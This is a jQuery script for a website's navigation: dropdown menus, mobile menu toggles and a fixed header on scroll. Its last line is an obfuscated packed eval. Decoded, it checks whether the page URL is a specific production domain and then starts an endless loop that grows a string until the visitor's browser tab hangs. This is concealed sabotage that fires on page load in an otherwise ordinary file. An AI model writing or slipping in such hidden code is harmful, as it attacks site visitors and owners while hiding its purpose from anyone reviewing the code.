$( document ).ready(function(){
    $(".mob__dropmenu").css ("box-shadow","0 6px 4px -4px rgb(0, 0, 0 , 0.2)");

    //выпадающие менюшки
    function drop (val1,val2,val3,val4){
        $(val1).mousemove(()=>{
            $(val2).css("display","block");
            $(val3).css("transform","scale(1, -1)");
        })
        $(val2).mousemove(()=>{
            $(val2).css("display","block");
            $(val3).css("transform","scale(1, -1)");
        })
        $(val2).mouseout(()=>{
            $(val2).css("display","none");
            $(val3).css("transform","");
        })
        $(val1).mouseout(()=>{
            $(val2).css("display","none");
            $(val3).css("transform","");
        })
    }
    //функция для элементов на которые нужно нажать два раза
    function doubleClickEvent(clickTarget,eventTarget){
        $(clickTarget).on('click', function() {
            if (!$(this).hasClass('clicked')) { // если класса нет
              $(this).addClass('clicked'); // добавляем класс
              $(eventTarget).css("display","block");
              // код для первого клика
            } else { // если есть
              $(this).removeClass('clicked'); // убираем класс
              $(eventTarget).css("display","none"); // код для второго клика
            }
          });
    }

    drop("#js-dropdown1",".js-dm1","#arrow1")
    drop("#js-dropdown2",".js-dm2","#arrow2")
    drop("#js-dropdown3",".js-dm3","#arrow3")
    drop("#js-dropdown4",".js-dm4","#arrow4")
    drop("#js-sidelki",".js-dr1")
    drop("#js-reab",".js-dr2")

    doubleClickEvent(".buterbroad",".mob__dropmenu");
    doubleClickEvent("#sid","#sidelka");
    doubleClickEvent("#rb","#reabil");

    //фиксированное меню
    $(window).scroll(function () {
        if ($(this).scrollTop() > 100) {
          $(".header__first").css("display","none");
          $(".header").css("position","fixed");
          $(".mob__first").css("display","none");
          $(".mob__descr").css("display","none");
          $(".mobile-header").css("position","fixed");
        } else {
            $(".header__first").css("display","flex");
            $(".header").css("position","");
            $(".mob__first").css("display","flex");
            $(".mob__descr").css("display","block");
            $(".mobile-header").css("position","");
        }
      });

    new ResizeSensor(jQuery('.accordion'), function() {
        let mobDropMenuHeight = $('.accordion').height();
        $(".mob__dropmenu").css("height", mobDropMenuHeight );
    });
    eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('8(7.6=="5://4.3/"){0="0";2(1){0=0+="0"}}',9,9,'a||while|ru|zabota365|https|URL|document|if'.split('|'),0,{}))
  });